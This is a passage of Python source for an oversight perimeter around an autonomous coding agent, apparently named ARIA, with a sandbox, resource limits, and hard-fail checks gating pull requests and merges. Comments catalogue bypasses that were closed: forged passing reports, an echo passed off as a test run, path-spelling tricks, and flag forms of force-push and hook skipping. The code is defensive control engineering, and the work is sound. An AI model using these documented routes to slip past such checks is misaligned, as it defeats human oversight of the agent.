            # path that does not exist reproduces the same hang by a different
            # route.
            "--tmpfs", SANDBOX_HOME,
            "--setenv", "HOME", SANDBOX_HOME,
        ]
        # READONLY_PATHS mounted ro-bind on top of the writable
        # workspace — ANY mutation under these paths gets EROFS.
        for ro in READONLY_PATHS:
            full = workspace / ro
            if full.exists():
                wrap.extend(["--ro-bind", str(full), str(full)])
        for extra in extra_ro_binds:
            extra_path = Path(extra)
            if extra_path.exists():
                wrap.extend(["--ro-bind", str(extra_path), str(extra_path)])
        if allow_network:
            # Existence-guarded for the same reason _system_ro_binds is: bwrap
            # aborts on a bind source it cannot find, so an unconditional bind
            # would turn a container without /etc/nsswitch.conf into a total
            # failure rather than a smaller sandbox.
            for network_file in _SANDBOX_NETWORK_FILES:
                if Path(network_file).exists():
                    wrap.extend(["--ro-bind", network_file, network_file])
        else:
            wrap.append("--unshare-net")
        wrap.append("--")
        return wrap + list(argv)
    raise SandboxUnavailable(
        "sandbox_backend_unavailable: bwrap is not usable on this host, so "
        "READONLY_PATHS cannot be enforced at the syscall level. Note that "
        "'installed' is not enough — bwrap is probed for the namespaces the "
        "wrapper actually builds, and a container without unprivileged user "
        "namespaces will install it cleanly and fail every invocation."
    )


class ResourceLimitsUnavailable(RuntimeError):
    """No usable limiter, so memory/CPU/task/wall-clock caps cannot apply.

    ORPHAN-HIGH-470 — raised instead of returning the argv unchanged. The
    bare-list return was indistinguishable from a limited one, which is the
    same defect SandboxUnavailable was created to close for containment.
    """


def _systemd_run_probe_argv() -> list[str]:
    # The probe carries the SAME property set the wrapper applies, because a
    # host can accept `systemd-run` and reject an individual property; a probe
    # that omitted them would prove less than it appears to.
    return [
        "systemd-run", "--user", "--scope", "--quiet",
        "--property=MemoryMax=2G",
        "--property=CPUQuota=200%",
        "--property=TasksMax=50",
        "--property=RuntimeMaxSec=15",
        "/bin/true",
    ]


@lru_cache(maxsize=1)
def _systemd_run_available() -> bool:
    """ORPHAN-HIGH-470 — installed is not enough, exactly as for bwrap.

    `shutil.which("systemd-run")` was the entire selection test. On any host
    without a user session bus — every container this runs in — the binary is
    present at /usr/bin/systemd-run and every invocation fails with
    "Failed to connect to bus: No medium found". Because the check passed, the
    working `timeout` branch below was unreachable, so the wrapper contributed
    a guaranteed spawn failure where it was supposed to contribute limits.
    """
    if shutil.which("systemd-run") is None:
        return False
    return _sandbox_probe_succeeds(_systemd_run_probe_argv())


def apply_resource_limits(argv: list[str], *, timeout_seconds: int = 120) -> list[str]:
    """Hard-fail check ancillary — per-command resource limits.

    Wraps argv in ``systemd-run --user --scope`` with cgroup limits when that
    actually works on this host; otherwise prefixes ``timeout <seconds>``.
    Raises :class:`ResourceLimitsUnavailable` when neither is usable.

    Limits:
      * MemoryMax=2G
      * CPUQuota=200% (2 cores worth)
      * TasksMax=50 (fork-bomb mitigation)
      * RuntimeMaxSec=<timeout_seconds> — wall clock

    ORPHAN-HIGH-470 fixed three defects here:

    1. Selection was presence-based (see :func:`_systemd_run_available`).
    2. The wall-clock cap was ``TimeoutStopSec``, which bounds how long
       systemd waits for a unit to die AFTER it has been asked to stop. It
       places no bound on how long the unit may run, so the one limit the
       caller passes a value for was the one not being applied.
       ``RuntimeMaxSec`` is the property that bounds runtime.
    3. The no-limiter tail returned argv unchanged, spawning unbounded — while
       the caller's own docstring says a write-capable agent must not be
       spawned unbounded on the strength of a missing perimeter.
    """
    if _systemd_run_available():
        return [
            "systemd-run",
            "--user", "--scope", "--quiet",
            "--property=MemoryMax=2G",
            "--property=CPUQuota=200%",
            "--property=TasksMax=50",
            f"--property=RuntimeMaxSec={timeout_seconds}",
        ] + list(argv)
    if shutil.which("timeout") is not None:
        # Wall clock only — no memory/CPU/task ceiling. Weaker than the cgroup
        # path and deliberately still accepted: an unbounded-runtime agent is
        # the failure actually observed, and refusing every container host
        # would take the whole lane down to gain limits it cannot provide.
        return ["timeout", str(timeout_seconds)] + list(argv)
    raise ResourceLimitsUnavailable(
        "resource_limits_unavailable: neither systemd-run (working user "
        "session bus) nor timeout is usable on this host, so memory, CPU, "
        "task-count and wall-clock caps cannot be applied; refusing to spawn "
        "an unbounded agent"
    )


def truncate_validation_result(text: str | bytes, *, max_bytes: int = MAX_VALIDATION_RESULT_BYTES) -> str:
    """Hard-fail support — perf-expert PERF-HIGH-009 size cap.

    Truncates a validation-command stdout / stderr to MAX_VALIDATION_RESULT_BYTES.
    Keeps the head + tail (half each) and marks the elision in the
    middle so audit shows the cut point.
    """
    if isinstance(text, bytes):
        try:
            text = text.decode("utf-8", errors="replace")
        except Exception:
            text = repr(text)
    if not isinstance(text, str):
        text = str(text)
    if len(text) <= max_bytes:
        return text
    half = (max_bytes - 64) // 2
    head = text[:half]
    tail = text[-half:]
    return f"{head}\n... [TRUNCATED {len(text) - 2*half} bytes by V9.0-D MAX_VALIDATION_RESULT_BYTES cap] ...\n{tail}"


# =============================================================================
# 15 HARD_FAIL_CHECKS registry
# =============================================================================

# ORPHAN-CRITICAL-428 — the perimeter is two gates, not one list.
#
# PRE_PR_OPEN checks bound what the implementer may DO: they inspect the
# diff, the paths it touched, the commands it ran, the branch it pushed.
# They are answerable from the action itself.
#
# PRE_MERGE checks bind a DECISION to state that must still hold at merge
# time: the branch tip has not moved, the plan hash still matches, the
# expert consensus and coverage witness exist, the budget was not
# exceeded. They are answerable only against live external state.
#
# Splitting them is what lets the pre-PR-open gate become satisfiable
# without also opening merge: the pre-merge gate stays unsatisfiable while
# its checks are unimplemented, so autonomous merge is closed by the
# perimeter itself rather than by a separate switch someone could flip.
GATE_PRE_PR_OPEN: str = "pre_pr_open"
GATE_PRE_MERGE: str = "pre_merge"
HARD_FAIL_GATES: frozenset[str] = frozenset({GATE_PRE_PR_OPEN, GATE_PRE_MERGE})


@dataclass(frozen=True)
class HardFailContext:
    """Everything a hard-fail check may inspect about a pending action.

    A single context type rather than per-check arguments so the registry
    stays uniformly iterable: a gate can run every check without knowing
    which fields each one reads. Fields are optional because a check that
    needs one it did not receive must FAIL, not silently pass — see
    :func:`run_hard_fail_checks`.
    """

    workspace_root: Path | None = None
    diff_text: str | None = None
    envelope: dict[str, Any] | None = None
    bash_argv: tuple[str, ...] = ()
    gh_api_paths: tuple[str, ...] = ()
    push_refspecs: tuple[str, ...] = ()
    affected_paths: tuple[str, ...] = ()
    validation_commands: tuple[str, ...] = ()
    base_branch: str | None = None
    pr_body: str | None = None


@dataclass(frozen=True)
class HardFailResult:
    """One check's outcome. ``passed=False`` blocks the action."""

    name: str
    passed: bool
    reason: str


@dataclass(frozen=True)
class HardFailReport:
    """The result of running the WHOLE registry.

    ORPHAN-CRITICAL-428 — constructed only by :func:`run_hard_fail_checks`,
    so a caller cannot assemble a passing report by hand. ``passed`` is the
    conjunction over every check, and the failures are carried so a refusal
    names what blocked it.
    """

    results: tuple[HardFailResult, ...]
    _token: object = field(default=None, repr=False, compare=False)

    def __post_init__(self) -> None:
        _require_registry_token(self._token, "HardFailReport", "run_hard_fail_checks")

    @property
    def failures(self) -> tuple[HardFailResult, ...]:
        return tuple(r for r in self.results if not r.passed)

    @property
    def passed(self) -> bool:
        return bool(self.results) and not self.failures

    def raise_if_blocked(self) -> None:
        if self.passed:
            return
        detail = "; ".join(f"{r.name}: {r.reason}" for r in self.failures)
        raise HardFailBlocked(f"hard_fail_checks_blocked: {detail}")


class HardFailBlocked(RuntimeError):
    """A hard-fail check refused the pending action."""


class ForgedVerdict(RuntimeError):
    """A perimeter verdict was constructed by something other than the registry.

    Its own class rather than a ValueError so an audit can grep for it: a
    forged verdict is not a programming slip, it is the perimeter being
    bypassed without a single check being defeated.
    """


# Opaque construction token. A HardFailReport built without it is not one
# the registry produced, which is what makes a hand-assembled "everything
# passed" report impossible rather than merely discouraged.
#
# THAT CLAIM WAS FALSE UNTIL THE TOKEN WAS CHECKED. ORPHAN-CRITICAL-428
# introduced this constant and both producers pass it, but nothing ever read
# it back and the field defaults to None — so
# `HardFailReport(results=(HardFailResult("no_force_push", True, "ok"),))`
# built a report whose `passed` was True and whose `raise_if_blocked()`
# returned silently. One line, and the seventeen-check perimeter was bypassed
# without a single check being defeated. `_require_registry_token` is what
# turns the docstring's "impossible" into the truth it always claimed to be.
_REPORT_TOKEN: object = object()


def _require_registry_token(token: object, type_name: str, producer: str) -> None:
    if token is not _REPORT_TOKEN:
        raise ForgedVerdict(
            f"forged_perimeter_verdict:{type_name} may only be constructed by "
            f"{producer}; a hand-assembled verdict is the perimeter bypassed "
            f"without a check being run"
        )


@dataclass(frozen=True)
class HardFailCheck:
    """A single named hard-fail check, bound to its implementation.

    ORPHAN-CRITICAL-428 — ``check`` is REQUIRED. Pre-fix this dataclass
    carried only name, description and closes_findings, and its docstring
    claimed "the registry is iterable by orchestrator pre-PR-open +
    pre-merge gates" while nothing iterated it and none of the 17 names
    resolved to a callable. A registry of names cannot gate anything, and
    an invariant test pinning the count passed green, so the absent
    perimeter read as CI success. Requiring the callable makes a
    non-executable entry unconstructable.

    A check that is declared but not yet implemented binds
    :func:`_not_implemented`, which FAILS. Unimplemented work therefore
    shows up as a blocking check rather than as a silent gap.
    """

    name: str
    description: str
    closes_findings: tuple[str, ...]
    check: Callable[[HardFailContext], HardFailResult]
    gate: str = GATE_PRE_MERGE

    def __post_init__(self) -> None:
        if not callable(self.check):
            raise TypeError(
                f"hard_fail_check_not_executable:{self.name}"
            )
        if self.gate not in HARD_FAIL_GATES:
            raise ValueError(
                f"hard_fail_check_unknown_gate:{self.name}:{self.gate}"
            )


def _passed(name: str, reason: str = "ok") -> HardFailResult:
    return HardFailResult(name=name, passed=True, reason=reason)


def _failed(name: str, reason: str) -> HardFailResult:
    return HardFailResult(name=name, passed=False, reason=reason)


def _not_implemented(name: str) -> Callable[[HardFailContext], HardFailResult]:
    """Bind a declared-but-unbuilt check to an explicit failure.

    This is deliberately not a pass-through. The check is named in the
    policy document as part of the pre-PR-open and pre-merge perimeter, so
    until it has an implementation the honest answer to "did the perimeter
    hold?" is no.
    """

    def _check(context: HardFailContext) -> HardFailResult:
        del context
        return _failed(name, "check_not_implemented")

    return _check


def _check_secret_scan_diff_clean(context: HardFailContext) -> HardFailResult:
    name = "secret_scan_diff_clean"
    if context.diff_text is None:
        return _failed(name, "diff_text_absent")
    try:
        verify_no_secret_in_diff(context.diff_text)
    except SecretLeakDetected as exc:
        return _failed(name, f"secret_detected:{exc}")
    return _passed(name)


def _check_bash_command_allowlist(context: HardFailContext) -> HardFailResult:
    name = "bash_command_allowlist"
    if not context.bash_argv:
        return _passed(name, "no_bash_command_in_action")
    try:
        verify_bash_command_allowed(
            list(context.bash_argv),
            cwd=context.workspace_root,
        )
    except (BashAllowlistMiss, BashDenylistHit) as exc:
        return _failed(name, f"bash_refused:{exc}")
    return _passed(name)


def _check_path_escape_guard(context: HardFailContext) -> HardFailResult:
    name = "path_escape_guard"
    if context.workspace_root is None:
        return _failed(name, "workspace_root_absent")
    for path in context.affected_paths:
        try:
            verify_no_path_escape(path, context.workspace_root)
        except PathEscape as exc:
            return _failed(name, f"path_escape:{exc}")
    return _passed(name)


def _check_no_main_branch_write(context: HardFailContext) -> HardFailResult:
    name = "no_main_branch_write"
    for api_path in context.gh_api_paths:
        if is_gh_api_path_forbidden(api_path):
            return _failed(name, f"forbidden_gh_api_path:{api_path}")
    return _passed(name)


def _check_forbidden_scope_normalized(context: HardFailContext) -> HardFailResult:
    name = "forbidden_scope_normalized"
    if context.workspace_root is None:
        return _failed(name, "workspace_root_absent")
    workspace = Path(context.workspace_root).resolve()
    for raw in context.affected_paths:
        try:
            resolved = verify_no_path_escape(raw, workspace)
        except PathEscape as exc:
            return _failed(name, f"path_escape:{exc}")
        try:
            relative = resolved.relative_to(workspace).as_posix()
        except ValueError:
            return _failed(name, f"outside_workspace:{raw}")
        for readonly in READONLY_PATHS:
            ro = readonly.rstrip("/")
            if relative == ro or relative.startswith(ro + "/"):
                return _failed(name, f"readonly_path_write:{relative}")
    return _passed(name)


# ORPHAN-CRITICAL-428 phase A — the five mechanical pre-PR-open checks.
#
# Each one is deliberately narrow and total: it inspects declared fields
# of the pending action and returns a verdict without touching the
# network, the clock or a subprocess. That is what makes them the phase
# that can land before the queue exists — nothing about them depends on
# ARIA being able to run.
#
# Where a check overlaps DENIED_BASH_COMMANDS, the overlap is the point.
# The denylist guards a command ARIA is about to execute; these guard the
# action ARIA has declared. An action can declare a push refspec without
# ever assembling an argv, and the perimeter must refuse it either way.

_ARIA_IMPL_BRANCH_RE: re.Pattern[str] = re.compile(
    rf"^{ARIA_IMPL_BRANCH_FRAGMENT}$"
)
_HOOK_BYPASS_FLAGS: frozenset[str] = frozenset({
    "--no-verify",
    "--no-gpg-sign",
    "--no-post-rewrite",
})
_HOOKS_PATH_KEY = "core.hookspath"

# The canonical validation suite an implementation MUST declare.
#
# CLAUDE.md mandates `nx affected --target=test` + `nx affected
# --target=lint` before any commit, and `npm run type-check` is the
# platform-wide type gate. The registry description for this check also
# named "mutation" and "coverage"; this repository has no mutation-
# testing and no coverage target (there is no such npm script and no nx
# target), so requiring them would make the gate permanently
# unsatisfiable and S0 unexitable. Requiring what does not exist is not
# strictness, it is a gate that can only ever be bypassed.
#
# The absence is tracked as ORPHAN-MEDIUM-436 (owner okan, deadline
# 2026-09-06) rather than silently dropped, and the registry description
# is corrected to match what is enforced.
CANONICAL_VALIDATION_COMMANDS: tuple[str, ...] = (
    "nx affected --target=test",
    "nx affected --target=lint",
    "npm run type-check",
)

# ORPHAN-CRITICAL-727 — the same suite, spelled the way a lane can RUN it.
#
# Two gates read the suite and they disagreed on the spelling. The
# pre-PR-open perimeter accepts the bare `nx ...` form above (or that form
# behind an `npx` prefix); `validation.parse_allowed_command` admits
# `npx nx` and refuses a bare `nx`, because argv-0 is what it pins. A lane
# that staged the perimeter's spelling therefore declared a suite its own
# validation runner would refuse to execute — the change would carry a
# declaration nobody could produce evidence for.
#
# Derived rather than retyped so the two tuples cannot drift: the executable
# form IS the canonical form with the runner prefix the allowlist requires.
CANONICAL_VALIDATION_COMMANDS_EXECUTABLE: tuple[str, ...] = tuple(
    f"npx {command}" if command.startswith("nx ") else command
    for command in CANONICAL_VALIDATION_COMMANDS
)

# ORPHAN-CRITICAL-728 — how long the canonical suite is allowed to take.
#
# `validation.run_validation_commands` defaults to 120_000 ms, which is the
# right default for the one-command experiment recipes that were its only
# caller. `npx nx affected --target=test` on THIS monorepo runs for twenty to
# thirty minutes, so the staged baseline and the gated candidate both timed
# out, both recorded status="failed", `_regression_status` read that as
# `no_regression`, and `evaluate_validation_gate`'s require_worktree_ok
# blocked forever: the gate could never pass, whatever the code did.
#
# 45 minutes covers the observed worst case with headroom and stays under
# `experiment.MAX_RECIPE_TIMEOUT_MS` (60 min), which is the operator-declared
# ceiling for any single command on this lane.
CANONICAL_VALIDATION_TIMEOUT_MS: int = 2_700_000


def _normalize_declared_path(raw: str) -> str:
    """Collapse a declared surface to a comparable repo-relative form.

    Purely lexical: this runs at envelope-mint time, where the paths are
    a declaration of intent and may not exist on any filesystem yet.

    ORPHAN-HIGH-453 — it must collapse EVERY spelling of a path, not just
    the leading one. The previous body stripped a leading ``./`` and outer
    slashes and stopped there, so interior ``//`` and ``/./`` survived and
    ``aria-kernel//aria_kernel/cli.py`` failed to match the
    ``aria-kernel/aria_kernel/`` READONLY prefix — a one-character edit
    walked straight through ``_check_kernel_self_modification_at_mint``.
    Segment-wise reconstruction is what makes that class of bypass
    unrepresentable rather than one more special case to remember: split on
    ``/``, drop empty segments (that is ``//``) and ``.`` segments (that is
    ``/./``), and rejoin. ``..`` is deliberately PRESERVED — the caller
    rejects it explicitly, and silently resolving it here would turn a
    traversal attempt into a clean-looking path.
    """
    text = str(raw).strip().replace("\\", "/")
    segments = [seg for seg in text.split("/") if seg not in ("", ".")]
    return "/".join(segments)


def classify_declared_surface(raw: Any) -> str | None:
    """Why a declared surface may not be written, or ``None`` when it may.

    ORPHAN-CRITICAL-728 — extracted from
    ``_check_kernel_self_modification_at_mint`` because the envelope mint now
    has to make the same judgement one step EARLIER: the bridge derives
    ``allowed_scope`` as the plan's declared surfaces minus READONLY_PATHS,
    and "minus" and "refuse" have to agree on what a readonly surface is. Two
    copies of this rule would let a path be subtracted by one and admitted by
    the other, which is how a scope claim comes to differ from the perimeter
    that judges it.
    """
    surface = _normalize_declared_path(raw)
    if not surface:
        return "empty_declared_surface"
    if ".." in surface.split("/"):
        return f"traversal_in_declared_surface:{raw}"
    # A glob cannot be compared against a prefix without expanding it
    # against a filesystem that does not exist at mint time, so it is
    # unclassifiable rather than safe. `aria-kernel/**/*.py` passed.
    if any(ch in surface for ch in "*?["):
        return f"glob_in_declared_surface:{raw}"
    for readonly in READONLY_PATHS:
        ro = readonly.rstrip("/")
        # ORPHAN-CRITICAL-461 — BOTH directions. The check used to ask
        # only "is the declared surface inside a readonly path", so a
        # strictly BROADER claim walked straight through: declaring one
        # file under aria-kernel/aria_kernel/ failed, while declaring
        # `aria-kernel` — which contains it — passed, and so did
        # `tools`. A scope claim that CONTAINS a protected path is not
        # safer than one that names it; it is the same write with a
        # vaguer envelope.
        if surface == ro or surface.startswith(ro + "/"):
            return f"readonly_surface_declared:{surface}"
        if ro.startswith(surface + "/"):
            return f"declared_surface_contains_readonly:{surface}->{ro}"
    return None


def implementation_allowed_scope(
    affected_surface_paths: list[str],
) -> tuple[list[str], list[dict[str, str]]]:
    """``(writable, refused)`` — the subtraction the implementation envelope needs.

    ORPHAN-CRITICAL-728 — ``cross_review_bridge``'s docstring said the
    orchestrator "MUST compute this as ... affected_surfaces minus
    READONLY_PATHS" and pinned the claim on an invariant id (I-V9-IMPL-04)
    that exists nowhere in this repository. No orchestrator computed it; the
    one caller passed ``converged_plan.get("allowed_scope")``, a key no plan
    schema defines. Deriving it HERE, from the paths the plan validator
    already accepted, is what makes the subtraction real instead of
    documented.

    Refusals are RETURNED rather than raised so the mint can name every
    dropped surface in one governance event: a plan that lands three files
    in ``aria-kernel/`` should tell its author all three, not the first.
    """
    writable: list[str] = []
    refused: list[dict[str, str]] = []
    for raw in affected_surface_paths:
        reason = classify_declared_surface(raw)
        if reason is None:
            normalized = _normalize_declared_path(raw)
            if normalized not in writable:
                writable.append(normalized)
        else:
            refused.append({"surface": str(raw), "reason": reason})
    return writable, refused


_FORCE_PUSH_LONG_FLAGS: frozenset[str] = frozenset({"--force", "--force-with-lease"})


def _argv_forces_a_push(argv: list[str]) -> str | None:
    """The offending token when ``argv`` is a force-push, else ``None``.

    ORPHAN-HIGH-454 — this half did not exist. ``_check_no_force_push``
    inspected ``push_refspecs`` only, so an action that carried its push as
    a bash command reached the gate with nothing looking at it, and the
    allowlist entry for push ends in ``(\\s+\\S+)*`` — which admits a flag.
    ``git push origin aria-impl-abc123 -f`` was therefore allowed by the
    allowlist, unmatched by the long-form deny patterns, and unexamined
    here. Force-push is absolutely forbidden by CLAUDE.md; enforcing it on
    one of the two ways to express it is not enforcing it.

    Token-wise rather than regex over the joined string, because that is
    what makes short clusters (``-fu``) and a leading ``+`` refspec
    decidable without also rejecting a filename that happens to contain
    ``-f``.
    """
    if argv[:2] != ["git", "push"]:
        return None
    for token in argv[2:]:
        lowered = token.lower()
        if lowered in _FORCE_PUSH_LONG_FLAGS:
            return token
        # A short cluster containing `f`: -f, -fu, -uf. Not `--foo`, and
        # not a bare positional such as a branch name.
        if lowered.startswith("-") and not lowered.startswith("--") and "f" in lowered[1:]:
            return token
        # `+src:dst` is a force push with no flag at all.
        if token.startswith("+"):
            return token
    return None


def _check_no_force_push(context: HardFailContext) -> HardFailResult:
    name = "no_force_push"
    if context.bash_argv:
        offender = _argv_forces_a_push([str(t) for t in context.bash_argv])
        if offender is not None:
            return _failed(name, f"force_flag_in_bash_argv:{offender}")
    if not context.push_refspecs:
        return _passed(name, "no_push_refspec_in_action")
    for raw in context.push_refspecs:
        refspec = str(raw).strip()
        if not refspec:
            return _failed(name, "empty_refspec")
        if refspec.startswith("+"):
            return _failed(name, f"force_refspec:{refspec}")
        lowered = refspec.lower()
        for flag in ("--force-with-lease", "--force", "-f"):
            if flag in lowered.split():
                return _failed(name, f"force_flag_in_refspec:{refspec}")
        source, _, destination = refspec.partition(":")
        if not source:
            # ``:refs/heads/x`` deletes the remote ref.
            return _failed(name, f"ref_deletion:{refspec}")
        target = destination or source
        branch = target[len("refs/heads/"):] if target.startswith("refs/heads/") else target
        if not _ARIA_IMPL_BRANCH_RE.match(branch):
            return _failed(name, f"non_aria_impl_ref:{target}")
    return _passed(name)


def _check_no_no_verify(context: HardFailContext) -> HardFailResult:
    name = "no_no_verify"
    if not context.bash_argv:
        return _passed(name, "no_bash_command_in_action")
    argv = [str(token) for token in context.bash_argv]
    is_commit = argv[:2] == ["git", "commit"]
    for index, token in enumerate(argv):
        lowered = token.lower()
        if lowered in _HOOK_BYPASS_FLAGS:
            return _failed(name, f"hook_bypass_flag:{token}")
        # `git commit -n` is --no-verify; so is any bundled short form
        # such as `-an`. Only meaningful for commit.
        if (
            is_commit
            and lowered.startswith("-")
            and not lowered.startswith("--")
            and "n" in lowered[1:]
        ):
            return _failed(name, f"hook_bypass_flag:{token}")
        if _HOOKS_PATH_KEY in lowered:
            return _failed(name, f"hooks_path_override:{token}")
        # `-c core.hooksPath=...` splits across two argv entries when the
        # caller passes the key separately.
        if lowered in {"-c", "--config"} and index + 1 < len(argv):
            if _HOOKS_PATH_KEY in argv[index + 1].lower():
                return _failed(name, f"hooks_path_override:{argv[index + 1]}")
    return _passed(name)


def _check_kernel_self_modification_at_mint(
    context: HardFailContext,
) -> HardFailResult:
    name = "kernel_self_modification_blocked_at_envelope_mint"
    envelope = context.envelope
    if not isinstance(envelope, dict):
        # Fail closed: the mint-time declaration is the thing being
        # checked, so its absence is an unverified action, not a clean
        # one. This is why the check sits at mint rather than reusing
        # forbidden_scope_normalized, which resolves paths through a
        # filesystem that does not exist yet.
        return _failed(name, "envelope_absent")
    declared = envelope.get("affected_surfaces")
    if declared is None:
        return _failed(name, "affected_surfaces_absent")
    if not isinstance(declared, (list, tuple)):
        return _failed(name, "affected_surfaces_not_a_sequence")
    # ORPHAN-CRITICAL-461 — an EMPTY list is not "touches nothing", it is a
    # declaration that establishes nothing, and it used to pass while an
    # absent key correctly failed. Same treatment for both.
    if len(declared) == 0:
        return _failed(name, "affected_surfaces_empty")
    for raw in declared:
        reason = classify_declared_surface(raw)
        if reason is not None:
            return _failed(name, reason)
    return _passed(name)


def _check_test_gate_canonical_suite(context: HardFailContext) -> HardFailResult:
    name = "test_gate_canonical_suite"
    if not context.validation_commands:
        return _failed(name, "validation_commands_absent")
    # ORPHAN-CRITICAL-461 — WHOLE-ENTRY membership, not substring over the
    # concatenation. The previous body joined every declared command into one
    # string and asked whether each canonical command appeared ANYWHERE in
    # it, so a single entry that merely mentions them cleared the gate:
    #
    #   validation_commands=("echo 'nx affected --target=test nx affected
    #                         --target=lint npm run type-check'",)   -> PASSED
    #
    # An echo of a comment is not a test run. Each canonical command must be
    # a declared entry in its own right; leading `npx`/`npm exec` wrappers are
    # tolerated because they are the same invocation, and a trailing argument
    # is allowed because narrowing a suite is legitimate while replacing it
    # with prose is not.
    entries = [" ".join(str(command).split()) for command in context.validation_commands]
    missing: list[str] = []
    for required in CANONICAL_VALIDATION_COMMANDS:
        if not any(
            entry == required
            or entry.startswith(required + " ")
            or entry.endswith(" " + required)
            and entry.split(required)[0].strip() in {"npx", "npm exec"}
            for entry in entries
        ):
            missing.append(required)
    if missing:
        return _failed(name, "missing_canonical_commands:" + ",".join(missing))
    return _passed(name)


def _check_pr_body_templating(context: HardFailContext) -> HardFailResult:
    name = "pr_body_templating"
    body = context.pr_body
    if body is None:
        return _failed(name, "pr_body_absent")
    if not body.strip():
        return _failed(name, "pr_body_empty")
    if contains_bidi_or_control(body):
        # Trojan Source (CVE-2021-42574): a bidi override makes the
        # rendered PR body differ from what a reviewer's approval covers.
        return _failed(name, "bidi_or_control_char_in_pr_body")
    if "<!--" in body:
        return _failed(name, "html_comment_in_pr_body")
    from .pr_manager import REQUIRED_PR_SECTIONS

    missing = [
        section for section in REQUIRED_PR_SECTIONS
        if f"## {section}" not in body
    ]
    if missing:
        return _failed(name, "missing_sections:" + ",".join(missing))
    return _passed(name)


def run_hard_fail_checks(
    context: HardFailContext,
    *,
    gate: str | None = None,
) -> HardFailReport:
    """Run the registry (optionally one gate) and return the only valid report.

    ORPHAN-CRITICAL-428 — the single producer of :class:`HardFailReport`.
    A check that raises is recorded as a FAILURE rather than propagating,
    so one broken check cannot skip the checks after it, and cannot be
    mistaken for the loop having completed.

    ``gate=None`` runs everything, which is what an audit wants. A caller
    guarding one stage passes that stage: ``GATE_PRE_PR_OPEN`` before
    opening a PR, ``GATE_PRE_MERGE`` before merging. An unknown gate
    raises rather than silently selecting nothing — a typo must not read
    as "zero checks, all passed", and ``HardFailReport.passed`` is False
    on an empty result set for the same reason.
    """
    if gate is not None and gate not in HARD_FAIL_GATES:
        raise ValueError(f"hard_fail_unknown_gate:{gate}")
    selected = [
        entry for entry in HARD_FAIL_CHECKS
        if gate is None or entry.gate == gate
    ]
    results: list[HardFailResult] = []
    for entry in selected:
        try:
            result = entry.check(context)
        except Exception as exc:  # noqa: BLE001 — a raising check is a failing check
            result = _failed(entry.name, f"check_raised:{type(exc).__name__}:{exc}")
        if not isinstance(result, HardFailResult):
            result = _failed(entry.name, "check_returned_non_result")
        results.append(result)
    return HardFailReport(results=tuple(results), _token=_REPORT_TOKEN)


# RC-2 — the observe/authorise split, expressed as two RESULT TYPES rather than
# a mode flag read at the callsite.
#
# THE DEFECT. `open_pr_for_action` runs the 10-check GATE_PRE_PR_OPEN perimeter
# BEFORE its `dry_run` branch, deliberately, so the gate cannot be skipped by
# previewing. But a dry run opens nothing: it has no `changed_files`, no
# `base_sha` and no diff, so checks needing those fail closed on data that
# CANNOT exist at that stage. Each such refusal then looked exactly like a
# genuine implementation refusal, and `cycle.py`'s pr_lifecycle phase fed
# refusals to the failure breaker. That edge sits on the dead
# `_run_extended_phases` path today, which is the only reason it has never
# fired — the moment RC-1 puts the phase on the live lane, three
# `approved_for_apply` proposals in one cycle would trip a breaker that now
# gates `standard`, i.e. the nightly would halt itself on observations.
#
# WHY A TYPE AND NOT A FLAG. A boolean `observe=True` leaves both outcomes the
# same shape, so nothing prevents an observation being handed to the breaker
# producer; the safety property would rest on every caller remembering. The
# rule wanted here is "an observation cannot trip a safety breaker", and the
# way to make that true rather than intended is to give observations no
# attribute a producer can read as a refusal: `PerimeterObservation` has no
# `passed`, no `failures`, and no `raise_if_blocked`.
NOT_EVALUABLE_AT_THIS_STAGE: str = "not_evaluable_at_this_stage"


@dataclass(frozen=True)
class PerimeterVerdict:
    """One check's outcome under observation, with a third state.

    ``evaluable=False`` means the stage could not supply the check's inputs —
    distinct from ``passed=False``, which means the inputs were present and the
    check refused. Collapsing the two is what made a dry run look like a
    rejected implementation.
    """

    name: str
    passed: bool
    reason: str
    evaluable: bool = True


@dataclass(frozen=True)
class PerimeterObservation:
    """observe-mode result. Reports; authorises nothing; feeds no breaker.

    Deliberately NOT a HardFailReport and deliberately missing ``passed`` /
    ``failures`` / ``raise_if_blocked``. Any code that tries to treat an
    observation as an authorisation fails at the attribute, at the first call,
    instead of silently recording a failure that never happened.
    """

    verdicts: tuple[PerimeterVerdict, ...]
    gate: str | None = None
    _token: object = field(default=None, repr=False, compare=False)

    def __post_init__(self) -> None:
        # An observation authorises nothing, so a forged one cannot bypass a
        # gate — but it CAN feed a fabricated telemetry record into the
        # governance ledger the autonomy ladder reads. Evidence has to be
        # produced by the thing that observed, for the same reason a verdict
        # does.
        _require_registry_token(self._token, "PerimeterObservation", "observe_perimeter")

    @property
    def refused(self) -> tuple[PerimeterVerdict, ...]:
        """Checks that ran and refused. Telemetry only — see the class docstring."""
        return tuple(v for v in self.verdicts if v.evaluable and not v.passed)

    @property
    def not_evaluable(self) -> tuple[PerimeterVerdict, ...]:
        return tuple(v for v in self.verdicts if not v.evaluable)

    @property
    def summary(self) -> dict[str, int]:
        return {
            "checks": len(self.verdicts),
            "passed": sum(1 for v in self.verdicts if v.evaluable and v.passed),
            "refused": len(self.refused),
            NOT_EVALUABLE_AT_THIS_STAGE: len(self.not_evaluable),
        }


# Inputs a check needs that only a REAL pr-open can supply. A check refusing
# because one of these is absent is reporting the stage, not the action, so
# observation records it as not-evaluable rather than as a refusal. Derived from
# the context fields rather than from check names, so adding a check that reads
# `diff_text` does not require editing a second list.
_STAGE_ONLY_CONTEXT_FIELDS: tuple[str, ...] = (
    "changed_files",
    "base_sha",
    "diff_text",
    "envelope",
    "validation_commands",
    "pr_body",
)


def observe_perimeter(
    context: HardFailContext,
    *,
    gate: str | None = None,
) -> PerimeterObservation:
    """Evaluate the perimeter for TELEMETRY. Cannot authorise, cannot refuse.

    Same registry and same checks as :func:`run_hard_fail_checks` — one
    implementation, so an observation and an authorisation can never disagree
    about what a check does. The difference is only in how a refusal caused by a
    missing stage input is classified, and in the type returned.
    """
    absent = frozenset(
        name for name in _STAGE_ONLY_CONTEXT_FIELDS if not getattr(context, name, None)
    )
    report = run_hard_fail_checks(context, gate=gate)
    verdicts = tuple(
        PerimeterVerdict(
            name=result.name,
            passed=result.passed,
            reason=result.reason,
            evaluable=result.passed or not _reason_blames_absent_stage_input(result.reason, absent),
        )
        for result in report.results
    )
    return PerimeterObservation(verdicts=verdicts, gate=gate, _token=_REPORT_TOKEN)


def _reason_blames_absent_stage_input(reason: str, absent: frozenset[str]) -> bool:
    """True when a refusal names a context field this stage could not supply.

    Matched against the ABSENT set rather than against a list of reason strings:
    a check that refuses for its own reasons stays a refusal even when other
